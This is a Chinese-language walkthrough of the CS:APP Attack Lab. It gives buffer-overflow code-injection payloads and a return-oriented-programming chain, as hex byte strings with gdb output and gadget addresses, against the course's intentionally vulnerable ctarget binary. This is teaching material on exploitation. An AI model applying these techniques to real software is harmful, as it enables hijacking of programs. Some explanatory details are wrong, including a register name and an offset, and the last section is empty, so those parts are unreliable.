lab之前先阅读了该lab的文档 非常关键  
http://csapp.cs.cmu.edu/3e/attacklab.pdf  
Both CTARGET and RTARGET read strings from standard input. They do so with the function getbuf  
defined below:  
```c
unsigned getbuf()
{
char buf[BUFFER_SIZE];
Gets(buf);
return 1;
}
```

正式开始之前先用命令 lscpu | grep -i byte 查看机器是大端还是小端 这会影响输入的顺序  
Byte Order:            Little Endian  
显示为小端机器 则地址顺序相比正常写法需要改变   
如地址0x123456 需要写为 56 34 12  
再将ctarget gtarget用objdump转换成汇编代码以便了解函数地址  

### ***CI level1***
汇编代码中 函数touch1 在地址0x4017c0  
且getbuf有 rsp-0x28 即40bytes  
于是在输入的第40字节后添加地址 4017c0 以替换栈中的ret值  
答案如下(一行8位 每行放一次指令)
```
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40
```

### ***CI level2***
与上题不同 level2 需要编写一个函数将给定的cookie值带入指定的函数   
此时需要利用栈指针转跳 要利用栈指针 先找到栈指针位置  
```
Starting program: ctarget -q   
Cookie: 0x59b997fa   
Dump of assembler code for function getbuf:   
=> 0x00000000004017a8 <+0>:	sub    $0x28,%rsp   
   0x00000000004017ac <+4>:	mov    %rsp,%rdi   
   0x00000000004017af <+7>:	callq  0x401a40 <Gets>   
   0x00000000004017b4 <+12>:	mov    $0x1,%eax   
   0x00000000004017b9 <+17>:	add    $0x28,%rsp   
   0x00000000004017bd <+21>:	retq      
End of assembler dump.   
(gdb) p/x $rsp   
$1 = 0x5561dca0   
(gdb) p/x 0x5561dca0-0x28   
$2 = 0x5561dc78   
```
获得%rsp位置此时还没运行该指令分配空间 需要减去0x24 得到运行后的栈地址0x5561dc78 同样需要转换成小端地址78 dc 61 55   
运行得到的 Cookie: 0x59b997fa    
需要将cookie值(0x59b997fa)存入%rdi寄存器用于传参数给函数touch2    
再查看ctarget的汇编代码 得知touch2 的起始地址为 4017ec 即可开始写注入所需的函数   
File\:phase.s   
```assembly
pushq $0x4017ec
movq  $0x59b997fa,%rdi
retq

```
使用gcc -c选项编译该文件   
再利用objdump 反编译成机器码得到   
```
68 ec 17 40 00       	pushq  $0x4017ec   
48 c7 c7 fa 97 b9 59 	movq    $0x59b997fa,%rdi   
c3                   	retq      
```
则答案为  
```
68 ec 17 40 00 
48 c7 c7 fa 97 b9 59
c3  
00 00 00   
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00     
78 dc 61 55      
```


### ***CI level3***
和level2的思路一致 先获取touch3地址 0x4018fa  
level3需要将cookie转换成ascii字符串形式   
0x59b997fa 转化为字符串为 35 39 62 39 39 37 66 61   
同时 提示给出 touch3中会导致输入被覆盖    
因此 传递的参数不能直接储存至输入 于是在栈指针下方储存   
rsp + 0x8 = 0x5561dca8    
phase3.s:
```assembly
pushq $0x4018fa
movq  $0x5561dca8,%rdi
retq

```
反汇编得到   
```
fa 18 40 00       	   pushq  $0x4018fa
48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi
c3                   	retq   
```
答案   
```
68 fa 18 40 00
48 c7 c7 a8 dc 61 55 
c3 
00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 
35 39 62 39 39 37 66 61
```

### ***ROP level2***
和CI level2的要求一致 但是这题换了攻击方式 不能直接在输入区插入代码来达成目标 需要利用ret来转跳至已存在的代码来完成   
lab给出了farm.c文件 其中的函数即是用于攻击的方式  write up中也有操作对应的编码表   
提示给出利用函数start_farm 到函数mid_farm 即可完成 同时写到可以利用popq   
汇编代码地址0x401994 ~ 0x4019d0 为可用函数   

要求与CI leve2一致 即需要存储cookie至%rdi 并转跳至touch2   
先理清思路 由于栈随机化 导致地址不能确定 需要利用popq将数据从栈弹出到寄存器中   
即储存cookie至%rsp 再将其储存到寄存器 %rdi 再转跳函数touch2即可   
汇编代码地址0x4019ca开始的操作 有所需操作编码 `58 90 c3`     
`58` 为操作 `popq %rax` `90`为操作`nop`   
地址为0x4019cc   
汇编代码地址0x4019c3开始的操作 有所需操作编码 `48 89 c7 90` 并紧跟 `c3`   
`48 89 c7` 为操作`movq %rax, %rdx`         `c3` 为操作`ret` 
地址为0x4019c5
总结得到
```assembly
popq %rax
retq 
movq %rax,%rdi            
nop
retq
```
编写答案   
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
cc 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
c5 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
```

### ***ROP level3***
